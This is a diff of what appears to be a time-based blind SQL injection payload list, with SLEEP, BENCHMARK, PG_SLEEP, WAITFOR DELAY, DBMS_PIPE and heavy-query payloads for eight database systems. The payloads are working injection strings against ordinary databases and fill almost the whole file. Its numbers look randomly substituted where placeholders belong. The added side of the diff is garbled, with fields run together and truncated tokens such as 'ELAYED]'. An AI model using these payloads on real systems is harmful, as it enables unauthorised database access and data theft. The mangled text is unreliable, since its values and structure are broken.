@@ -1,1534 +1,257 @@
-root
-test
-title MySQL >= 5.0.12 AND time-based blind (query SLEEP)
-stype 5
-level 1
-risk 1
-clause 1,2,3,8,9
-where 1
-vector AND (SELECT 73 FROM (SELECT(SLEEP(69-(IF(8,0,77)))))WJfmnZ3e2)
-request
-payload AND (SELECT 26 FROM (SELECT(SLEEP(88)))3Z6vF4bol)
-response
-time 18
-details
-dbms MySQL
-dbms_version >= 5.0.12
-title MySQL >= 5.0.12 OR time-based blind (query SLEEP)
-stype 5
-level 1
-risk 3
-clause 1,2,3,9
-where 1
-vector OR (SELECT 57 FROM (SELECT(SLEEP(6-(IF(89,0,10)))))wrSLfLpGJ)
-request
-payload OR (SELECT 33 FROM (SELECT(SLEEP(76)))UoX2fVlig)
-response
-time 70
-details
-dbms MySQL
-dbms_version >= 5.0.12
-title MySQL >= 5.0.12 AND time-based blind (SLEEP)
-stype 5
-level 2
-risk 1
-clause 1,2,3,8,9
-where 1
-vector AND 29=IF((94),SLEEP(98),80)
-request
-payload AND SLEEP(55)
-response
-time 43
-details
-dbms MySQL
-dbms_version >= 5.0.12
-title MySQL >= 5.0.12 OR time-based blind (SLEEP)
-stype 5
-level 2
-risk 3
-clause 1,2,3,9
-where 1
-vector OR 38=IF((31),SLEEP(9),18)
-request
-payload OR SLEEP(74)
-response
-time 59
-details
-dbms MySQL
-dbms_version >= 5.0.12
-title MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)
-stype 5
-level 3
-risk 1
-clause 1,2,3,9
-where 1
-vector AND 25=IF((32),SLEEP(12),13)
-request
-payload AND SLEEP(97)
-comment #
-response
-time 94
-details
-dbms MySQL
-dbms_version >= 5.0.12
-title MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)
-stype 5
-level 3
-risk 3
-clause 1,2,3,9
-where 1
-vector OR 88=IF((61),SLEEP(81),64)
-request
-payload OR SLEEP(35)
-comment #
-response
-time 21
-details
-dbms MySQL
-dbms_version >= 5.0.12
-title MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)
-stype 5
-level 3
-risk 1
-clause 1,2,3,9
-where 1
-vector AND (SELECT 5 FROM (SELECT(SLEEP(19-(IF(48,0,6)))))3nzpCPnr3)
-request
-payload AND (SELECT 22 FROM (SELECT(SLEEP(28)))2kqdcQJiO)
-comment #
-response
-time 21
-details
-dbms MySQL
-dbms_version >= 5.0.12
-title MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)
-stype 5
-level 3
-risk 3
-clause 1,2,3,9
-where 1
-vector OR (SELECT 44 FROM (SELECT(SLEEP(62-(IF(69,0,87)))))p1PiZydQ3)
-request
-payload OR (SELECT 20 FROM (SELECT(SLEEP(50)))zQIKu4fYC)
-comment #
-response
-time 33
-details
-dbms MySQL
-dbms_version >= 5.0.12
-title MySQL < 5.0.12 AND time-based blind (BENCHMARK)
-stype 5
-level 2
+testMySQL >= 5.0.12 AND time-based blind (query SLEEP)
+ AND (SELECT 73 FROM (SELECT(SLEEP(69-(IF(8,0,77)))))WJfmnZ3e2)
+AND (SELECT 26 FROM (SELECT(SLEEP(88)))3Z6vF4bol)
+dbms_version >= 5.0.12MySQL >= 5.0.12 OR time-based blind (query SLEEP)
+ OR (SELECT 57 FROM (SELECT(SLEEP(6-(IF(89,0,10)))))wrSLfLpGJ)
+OR (SELECT 33 FROM (SELECT(SLEEP(76)))UoX2fVlig)
+dbms_version >= 5.0.12MySQL >= 5.0.12 AND time-based blind (SLEEP)
+ AND 29=IF((94),SLEEP(98),80)
+AND SLEEP(55)
+dbms_version >= 5.0.12MySQL >= 5.0.12 OR time-based blind (SLEEP)
+ OR 38=IF((31),SLEEP(9),18)
+OR SLEEP(74)
+dbms_version >= 5.0.12MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)
+ AND 25=IF((32),SLEEP(12),13)
+AND SLEEP(97)
+dbms_version >= 5.0.12MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)
+ OR 88=IF((61),SLEEP(81),64)
+OR SLEEP(35)
+dbms_version >= 5.0.12MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)
+ AND (SELECT 5 FROM (SELECT(SLEEP(19-(IF(48,0,6)))))3nzpCPnr3)
+AND (SELECT 22 FROM (SELECT(SLEEP(28)))2kqdcQJiO)
+dbms_version >= 5.0.12MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)
+ OR (SELECT 44 FROM (SELECT(SLEEP(62-(IF(69,0,87)))))p1PiZydQ3)
+OR (SELECT 20 FROM (SELECT(SLEEP(50)))zQIKu4fYC)
+dbms_version >= 5.0.12MySQL < 5.0.12 AND time-based blind (BENCHMARK)
 risk 2
-clause 1,2,3,8,9
-where 1
-vector AND 69=IF((72),BENCHMARK(3000000,MD5('NFJw0xlIY')),68)
-request
-payload AND 83=BENCHMARK(77000000,MD5('uPuXLp2Gj'))
-response
-time [DELAYED]
-details
-dbms MySQL
-dbms_version < 5.0.12
-title MySQL > 5.0.12 AND time-based blind (heavy query)
-stype 5
-level 3
+ AND 69=IF((72),BENCHMARK(3000000,MD5('NFJw0xlIY')),68)
+AND 83=BENCHMARK(77000000,MD5('uPuXLp2Gj'))ELAYED]
+dbms_version < 5.0.12MySQL > 5.0.12 AND time-based blind (heavy query)
 risk 2
-clause 1,2,3,8,9
-where 1
-vector AND 98=IF((27),(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1),52)
-request
-payload AND 1=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)
-response
-time [DELAYED]
-details
-dbms MySQL
-dbms_version > 5.0.12
-title MySQL < 5.0.12 OR time-based blind (BENCHMARK)
-stype 5
-level 2
-risk 3
-clause 1,2,3,9
-where 1
-vector OR 35=IF((37),BENCHMARK(25000000,MD5('OHDENHm6x')),45)
-request
-payload OR 86=BENCHMARK(53000000,MD5('60Eas1dMz'))
-response
-time [DELAYED]
-details
-dbms MySQL
-dbms_version < 5.0.12
-title MySQL > 5.0.12 OR time-based blind (heavy query)
-stype 5
-level 3
-risk 3
-clause 1,2,3,9
-where 1
-vector OR 38=IF((15),(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1),17)
-request
-payload OR 72=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)
-response
-time [DELAYED]
-details
-dbms MySQL
-dbms_version > 5.0.12
-title MySQL < 5.0.12 AND time-based blind (BENCHMARK - comment)
-stype 5
-level 5
+ AND 98=IF((27),(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1),52)
+AND 1=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)ELAYED]
+dbms_version > 5.0.12MySQL < 5.0.12 OR time-based blind (BENCHMARK)
+ OR 35=IF((37),BENCHMARK(25000000,MD5('OHDENHm6x')),45)
+OR 86=BENCHMARK(53000000,MD5('60Eas1dMz'))ELAYED]
+dbms_version < 5.0.12MySQL > 5.0.12 OR time-based blind (heavy query)
+ OR 38=IF((15),(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1),17)
+OR 72=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)ELAYED]
+dbms_version > 5.0.12MySQL < 5.0.12 AND time-based blind (BENCHMARK - comment)
 risk 2
-clause 1,2,3,9
-where 1
-vector AND 50=IF((57),BENCHMARK(29000000,MD5('xG7sAQ6DV')),1)
-request
-payload AND 23=BENCHMARK(86000000,MD5('wpdU8BmTw'))
-comment #
-response
-time [DELAYED]
-details
-dbms MySQL
-dbms_version < 5.0.12
-title MySQL > 5.0.12 AND time-based blind (heavy query - comment)
-stype 5
-level 5
+ AND 50=IF((57),BENCHMARK(29000000,MD5('xG7sAQ6DV')),1)
+AND 23=BENCHMARK(86000000,MD5('wpdU8BmTw'))ELAYED]
+dbms_version < 5.0.12MySQL > 5.0.12 AND time-based blind (heavy query - comment)
 risk 2
-clause 1,2,3,9
-where 1
-vector AND 81=IF((71),(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1),41)
-request
-payload AND 16=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)
-comment #
-response
-time [DELAYED]
-details
-dbms MySQL
-dbms_version > 5.0.12
-title MySQL < 5.0.12 OR time-based blind (BENCHMARK - comment)
-stype 5
-level 5
-risk 3
-clause 1,2,3,9
-where 1
-vector OR 61=IF((27),BENCHMARK(7000000,MD5('g8QUmoq2Y')),89)
-request
-payload OR 46=BENCHMARK(49000000,MD5('flYRjGGns'))
-comment #
-response
-time [DELAYED]
-details
-dbms MySQL
-dbms_version < 5.0.12
-title MySQL > 5.0.12 OR time-based blind (heavy query - comment)
-stype 5
-level 5
-risk 3
-clause 1,2,3,9
-where 1
-vector OR 77=IF((20),(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1),98)
-request
-payload OR 21=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)
-comment #
-response
-time [DELAYED]
-details
-dbms MySQL
-dbms_version > 5.0.12
-title MySQL >= 5.0.12 RLIKE time-based blind
-stype 5
-level 2
-risk 1
-clause 1,2,3,9
-where 1
-vector RLIKE (SELECT 74=IF((95),SLEEP(68),77))
-request
-payload RLIKE SLEEP(18)
-response
-time 27
-details
-dbms MySQL
-dbms_version >= 5.0.12
-title MySQL >= 5.0.12 RLIKE time-based blind (comment)
-stype 5
-level 4
-risk 1
-clause 1,2,3,9
-where 1
-vector RLIKE (SELECT 67=IF((23),SLEEP(70),32))
-request
-payload RLIKE SLEEP(55)
-comment #
-response
-time 58
-details
-dbms MySQL
-dbms_version >= 5.0.12
-title MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP)
-stype 5
-level 3
-risk 1
-clause 1,2,3,9
-where 1
-vector RLIKE (SELECT 68 FROM (SELECT(SLEEP(20-(IF(96,0,76)))))995SI4dHY)
-request
-payload RLIKE (SELECT 52 FROM (SELECT(SLEEP(41)))yg0s7Mc3t)
-response
-time 58
-details
-dbms MySQL
-dbms_version >= 5.0.12
-title MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP - comment)
-stype 5
-level 4
-risk 1
-clause 1,2,3,9
-where 1
-vector RLIKE (SELECT 52 FROM (SELECT(SLEEP(61-(IF(27,0,0)))))A3meJQLxE)
-request
-payload RLIKE (SELECT 99 FROM (SELECT(SLEEP(6)))LBan7PAAX)
-comment #
-response
-time 80
-details
-dbms MySQL
-dbms_version >= 5.0.12
-title MySQL AND time-based blind (ELT)
-stype 5
-level 3
-risk 1
-clause 1,2,3,8,9
-where 1
-vector AND ELT(60,SLEEP(56))
-request
-payload AND ELT(19=96,SLEEP(14))
-response
-time 36
-details
-dbms MySQL
-dbms_version >= 5.0.12
-title MySQL OR time-based blind (ELT)
-stype 5
-level 3
-risk 3
-clause 1,2,3,9
-where 1
-vector OR ELT(20,SLEEP(76))
-request
-payload OR ELT(72=99,SLEEP(37))
-response
-time 45
-details
-dbms MySQL
-title MySQL AND time-based blind (ELT - comment)
-stype 5
-level 5
-risk 1
-clause 1,2,3,9
-where 1
-vector AND ELT(94,SLEEP(19))
-request
-payload AND ELT(27=9,SLEEP(56))
-comment #
-response
-time 87
-details
-dbms MySQL
-title MySQL OR time-based blind (ELT - comment)
-stype 5
-level 5
-risk 3
-clause 1,2,3,9
-where 1
-vector OR ELT(98,SLEEP(25))
-request
-payload OR ELT(95=51,SLEEP(40))
-comment #
-response
-time 34
-details
-dbms MySQL
-title PostgreSQL > 8.1 AND time-based blind
-stype 5
-level 1
-risk 1
-clause 1,2,3,8,9
-where 1
-vector AND 85=(CASE WHEN (6) THEN (SELECT 99 FROM PG_SLEEP(13)) ELSE 44 END)
-request
-payload AND 62=(SELECT 50 FROM PG_SLEEP(83))
-response
-time 98
-details
-dbms PostgreSQL
-dbms_version > 8.1
-title PostgreSQL > 8.1 OR time-based blind
-stype 5
-level 1
-risk 3
-clause 1,2,3,9
-where 1
-vector OR 18=(CASE WHEN (50) THEN (SELECT 20 FROM PG_SLEEP(77)) ELSE 14 END)
-request
-payload OR 82=(SELECT 37 FROM PG_SLEEP(46))
-response
-time 40
-details
-dbms PostgreSQL
-dbms_version > 8.1
-title PostgreSQL > 8.1 AND time-based blind (comment)
-stype 5
-level 4
-risk 1
-clause 1,2,3,9
-where 1
-vector AND 66=(CASE WHEN (86) THEN (SELECT 73 FROM PG_SLEEP(20)) ELSE 9 END)
-request
-payload AND 81=(SELECT 20 FROM PG_SLEEP(0))
-comment --
-response
-time 11
-details
-dbms PostgreSQL
-dbms_version > 8.1
-title PostgreSQL > 8.1 OR time-based blind (comment)
-stype 5
-level 4
-risk 3
-clause 1,2,3,9
-where 1
-vector OR 88=(CASE WHEN (54) THEN (SELECT 53 FROM PG_SLEEP(22)) ELSE 87 END)
-request
-payload OR 97=(SELECT 96 FROM PG_SLEEP(11))
-comment --
-response
-time 29
-details
-dbms PostgreSQL
-dbms_version > 8.1
-title PostgreSQL AND time-based blind (heavy query)
-stype 5
-level 2
-risk 2
-clause 1,2,3,8,9
-where 1
-vector AND 93=(CASE WHEN (53) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,88000000)) ELSE 78 END)
-request
-payload AND 7=(SELECT COUNT(*) FROM GENERATE_SERIES(1,8000000))
-response
-time [DELAYED]
-details
-dbms PostgreSQL
-title PostgreSQL OR time-based blind (heavy query)
-stype 5
-level 2
-risk 3
-clause 1,2,3,9
-where 1
-vector OR 21=(CASE WHEN (50) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,71000000)) ELSE 15 END)
-request
-payload OR 47=(SELECT COUNT(*) FROM GENERATE_SERIES(1,51000000))
-response
-time [DELAYED]
-details
-dbms PostgreSQL
-title PostgreSQL AND time-based blind (heavy query - comment)
-stype 5
-level 5
-risk 2
-clause 1,2,3,9
-where 1
-vector AND 30=(CASE WHEN (69) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,99000000)) ELSE 56 END)
-request
-payload AND 57=(SELECT COUNT(*) FROM GENERATE_SERIES(1,47000000))
-comment --
-response
-time [DELAYED]
-details
-dbms PostgreSQL
-title PostgreSQL OR time-based blind (heavy query - comment)
-stype 5
-level 5
-risk 3
-clause 1,2,3,9
-where 1
-vector OR 11=(CASE WHEN (30) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,1000000)) ELSE 91 END)
-request
-payload OR 96=(SELECT COUNT(*) FROM GENERATE_SERIES(1,10000000))
-comment --
-response
-time [DELAYED]
-details
-dbms PostgreSQL
-title Microsoft SQL Server/Sybase time-based blind (IF)
-stype 5
-level 1
-risk 1
-clause 0
-where 1
-vector IF(64) WAITFOR DELAY '0:0:67'
-request
-payload WAITFOR DELAY '0:0:16'
-response
-time 67
-details
-dbms
-Microsoft SQL Server
-Sybase
-title Microsoft SQL Server/Sybase time-based blind (IF - comment)
-stype 5
-level 4
-risk 1
-clause 0
-where 1
-vector IF(81) WAITFOR DELAY '0:0:31'
-request
-payload WAITFOR DELAY '0:0:99'
-comment --
-response
-time 37
-details
-dbms
-Microsoft SQL Server
-Sybase
-title Microsoft SQL Server/Sybase AND time-based blind (heavy query)
-stype 5
-level 2
-risk 2
-clause 1,2,3,8,9
-where 1
-vector AND 68=(CASE WHEN (45) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE 90 END)
-request
-payload AND 56=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)
-response
-time [DELAYED]
-details
-dbms
-Microsoft SQL Server
-Sybase
-title Microsoft SQL Server/Sybase OR time-based blind (heavy query)
-stype 5
-level 2
-risk 3
-clause 1,2,3,9
-where 1
-vector OR 80=(CASE WHEN (37) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE 56 END)
-request
-payload OR 92=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)
-response
-time [DELAYED]
-details
-dbms
-Microsoft SQL Server
-Sybase
-title Microsoft SQL Server/Sybase AND time-based blind (heavy query - comment)
-stype 5
-level 5
-risk 2
-clause 1,2,3,9
-where 1
-vector AND 65=(CASE WHEN (48) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE 43 END)
-request
-payload AND 75=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)
-comment --
-response
-time [DELAYED]
-details
-dbms
-Microsoft SQL Server
-Sybase
-title Microsoft SQL Server/Sybase OR time-based blind (heavy query - comment)
-stype 5
-level 5
-risk 3
-clause 1,2,3,9
-where 1
-vector OR 23=(CASE WHEN (2) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE 61 END)
-request
-payload OR 27=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)
-comment --
-response
-time [DELAYED]
-details
-dbms
-Microsoft SQL Server
-Sybase
-title Oracle AND time-based blind
-stype 5
-level 1
-risk 1
-clause 1,2,3,9
-where 1
-vector AND 17=(CASE WHEN (15) THEN DBMS_PIPE.RECEIVE_MESSAGE('NyM2twl1F',19) ELSE 6 END)
-request
-payload AND 71=DBMS_PIPE.RECEIVE_MESSAGE('ttGvUZcaT',32)
-response
-time 44
-details
-dbms Oracle
-title Oracle OR time-based blind
-stype 5
-level 1
-risk 3
-clause 1,2,3,9
-where 1
-vector OR 99=(CASE WHEN (2) THEN DBMS_PIPE.RECEIVE_MESSAGE('B8B1B2Qc7',8) ELSE 86 END)
-request
-payload OR 65=DBMS_PIPE.RECEIVE_MESSAGE('fL7gwzRfW',36)
-response
-time 71
-details
-dbms Oracle
-title Oracle AND time-based blind (comment)
-stype 5
-level 4
-risk 1
-clause 1,2,3,9
-where 1
-vector AND 89=(CASE WHEN (36) THEN DBMS_PIPE.RECEIVE_MESSAGE('E3Ri8ya5f',67) ELSE 99 END)
-request
-payload AND 33=DBMS_PIPE.RECEIVE_MESSAGE('jho0p1Td2',69)
-comment --
-response
-time 66
-details
-dbms Oracle
-title Oracle OR time-based blind (comment)
-stype 5
-level 4
-risk 3
-clause 1,2,3,9
-where 1
-vector OR 11=(CASE WHEN (15) THEN DBMS_PIPE.RECEIVE_MESSAGE('q9MO75xPH',33) ELSE 37 END)
-request
-payload OR 47=DBMS_PIPE.RECEIVE_MESSAGE('RjG0zu3WN',2)
-comment --
-response
-time 98
-details
-dbms Oracle
-title Oracle AND time-based blind (heavy query)
-stype 5
-level 2
-risk 2
-clause 1,2,3,9
-where 1
-vector AND 25=(CASE WHEN (60) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE 84 END)
-request
-payload AND 72=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)
-response
-time [DELAYED]
-details
-dbms Oracle
-title Oracle OR time-based blind (heavy query)
-stype 5
-level 2
-risk 3
-clause 1,2,3,9
-where 1
-vector OR 56=(CASE WHEN (12) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE 37 END)
-request
-payload OR 87=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)
-response
-time [DELAYED]
-details
-dbms Oracle
-title Oracle AND time-based blind (heavy query - comment)
-stype 5
-level 5
-risk 2
-clause 1,2,3,9
-where 1
-vector AND 56=(CASE WHEN (35) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE 56 END)
-request
-payload AND 15=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)
-comment --
-response
-time [DELAYED]
-details
-dbms Oracle
-title Oracle OR time-based blind (heavy query - comment)
-stype 5
-level 5
-risk 3
-clause 1,2,3,9
-where 1
-vector OR 55=(CASE WHEN (73) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE 47 END)
-request
-payload OR 51=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)
-comment --
-response
-time [DELAYED]
-details
-dbms Oracle
-title IBM DB2 AND time-based blind (heavy query)
-stype 5
-level 3
-risk 2
-clause 1,2,3,9
-where 1
-vector AND 72=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3 WHERE (39))
-request
-payload AND 90=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)
-response
-time [DELAYED]
-details
-dbms IBM DB2
-title IBM DB2 OR time-based blind (heavy query)
-stype 5
-level 3
-risk 3
-clause 1,2,3,9
-where 1
-vector OR 21=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3 WHERE (43))
-request
-payload OR 93=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)
-response
-time [DELAYED]
-details
-dbms IBM DB2
-title IBM DB2 AND time-based blind (heavy query - comment)
-stype 5
-level 5
-risk 2
-clause 1,2,3,9
-where 1
-vector AND 9=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3 WHERE (26))
-request
-payload AND 0=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)
-comment --
-response
-time [DELAYED]
-details
-dbms IBM DB2
-title IBM DB2 OR time-based blind (heavy query - comment)
-stype 5
-level 5
-risk 3
-clause 1,2,3,9
-where 1
-vector OR 76=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3 WHERE (99))
-request
-payload OR 40=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)
-comment --
-response
-time [DELAYED]
-details
-dbms IBM DB2
-title SQLite > 2.0 AND time-based blind (heavy query)
-stype 5
-level 3
-risk 2
-clause 1,8,9
-where 1
-vector AND 28=(CASE WHEN (51) THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(5900000000/2))))) ELSE 16 END)
-request
-payload AND 72=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(3500000000/2))))
-response
-time [DELAYED]
-details
-dbms SQLite
-dbms_version > 2.0
-title SQLite > 2.0 OR time-based blind (heavy query)
-stype 5
-level 3
-risk 3
-clause 1,9
-where 1
-vector OR 29=(CASE WHEN (20) THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(600000000/2))))) ELSE 79 END)
-request
-payload OR 99=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(9700000000/2))))
-response
-time [DELAYED]
-details
-dbms SQLite
-dbms_version > 2.0
-title SQLite > 2.0 AND time-based blind (heavy query - comment)
-stype 5
-level 5
-risk 2
-clause 1,9
-where 1
-vector AND 30=(CASE WHEN (74) THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(4200000000/2))))) ELSE 37 END)
-request
-payload AND 51=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(6300000000/2))))
-comment --
-response
-time [DELAYED]
-details
-dbms SQLite
-dbms_version > 2.0
-title SQLite > 2.0 OR time-based blind (heavy query - comment)
-stype 5
-level 5
-risk 3
-clause 1,9
-where 1
-vector OR 100=(CASE WHEN (56) THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1400000000/2))))) ELSE 60 END)
-request
-payload OR 76=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(7500000000/2))))
-comment --
-response
-time [DELAYED]
-details
-dbms SQLite
-dbms_version > 2.0
-title Firebird >= 2.0 AND time-based blind (heavy query)
-stype 5
-level 4
-risk 2
-clause 1,9
-where 1
-vector AND 66=IIF((68),(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4),27)
-request
-payload AND 55=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)
-response
-time [DELAYED]
-details
-dbms Firebird
-dbms_version >= 2.0
-title Firebird >= 2.0 OR time-based blind (heavy query)
-stype 5
-level 4
-risk 3
-clause 1,9
-where 1
-vector OR 61=IIF((74),(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4),94)
-request
-payload OR 29=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)
-response
-time [DELAYED]
-details
-dbms Firebird
-dbms_version >= 2.0
-title Firebird >= 2.0 AND time-based blind (heavy query - comment)
-stype 5
-level 5
-risk 2
-clause 1,9
-where 1
-vector AND 91=IIF((98),(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4),49)
-request
-payload AND 66=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)
-comment --
-response
-time [DELAYED]
-details
-dbms Firebird
-dbms_version >= 2.0
-title Firebird >= 2.0 OR time-based blind (heavy query - comment)
-stype 5
-level 5
-risk 3
-clause 1,9
-where 1
-vector OR 20=IIF((75),(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4),51)
-request
-payload OR 38=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)
-comment --
-response
-time [DELAYED]
-details
-dbms Firebird
-dbms_version >= 2.0
-title SAP MaxDB AND time-based blind (heavy query)
-stype 5
-level 4
-risk 2
-clause 1,2,3,9
-where 1
-vector AND 90=(SELECT COUNT(*) FROM (SELECT * FROM DOMAIN.DOMAINS WHERE (37)) AS T1,(SELECT * FROM DOMAIN.COLUMNS WHERE (18)) AS T2,(SELECT * FROM DOMAIN.TABLES WHERE (68)) AS T3)
-request
-payload AND 8=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)
-response
-time [DELAYED]
-details
-dbms SAP MaxDB
-title SAP MaxDB OR time-based blind (heavy query)
-stype 5
-level 4
-risk 3
-clause 1,2,3,9
-where 1
-vector OR 43=(SELECT COUNT(*) FROM (SELECT * FROM DOMAIN.DOMAINS WHERE (42)) AS T1,(SELECT * FROM DOMAIN.COLUMNS WHERE (41)) AS T2,(SELECT * FROM DOMAIN.TABLES WHERE (92)) AS T3)
-request
-payload OR 81=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)
-response
-time [DELAYED]
-details
-dbms SAP MaxDB
